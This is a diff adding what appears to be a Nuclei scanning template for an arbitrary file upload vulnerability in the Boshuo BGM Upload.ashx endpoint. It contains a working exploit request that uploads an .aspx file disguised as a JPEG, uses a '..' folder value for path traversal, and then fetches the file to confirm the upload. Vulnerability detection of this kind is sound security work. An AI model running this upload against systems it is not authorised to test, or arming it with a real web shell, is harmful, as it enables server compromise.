@@ -1,0 +1,80 @@
+id: poc-yaml-bosure-bgm-upload-ashx-anyfile-upload
+info:
+  name: 博硕BGM Upload.ashx 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template checks for an arbitrary file upload vulnerability in 博硕BGM Upload.ashx.
+
+variables:
+  random_str: "{{rand_base(7)}}"
+  encoded_str: "{{base64(random_str)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/WebUpload/server/Upload.ashx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundary1234567890"
+    body: |-
+      ------WebKitFormBoundary1234567890
+      Content-Disposition: form-data; name="id"
+
+      WU_FILE_0
+      ------WebKitFormBoundary1234567890
+      Content-Disposition: form-data; name="name"
+
+      {{random_str}}.aspx
+      ------WebKitFormBoundary1234567890
+      Content-Disposition: form-data; name="size"
+
+      10000
+      ------WebKitFormBoundary1234567890
+      Content-Disposition: form-data; name="type"
+
+      image/jpeg
+      ------WebKitFormBoundary1234567890
+      Content-Disposition: form-data; name="OwnBaseFolder"
+
+      ..
+      ------WebKitFormBoundary1234567890
+      Content-Disposition: form-data; name="file"; filename="1.jpg"
+      Content-Type: image/jpeg
+
+      {{encoded_str}}
+      ------WebKitFormBoundary1234567890--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"FileName\""
+          - ".aspx"
+        part: body
+    extractors:
+      - type: regex
+        name: uploaded_file
+        regex:
+          - "Others/(?P<file>.*?).aspx"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/WebUpload/Upload/../Others/{{uploaded_file}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{encoded_str}}"
+        part: body
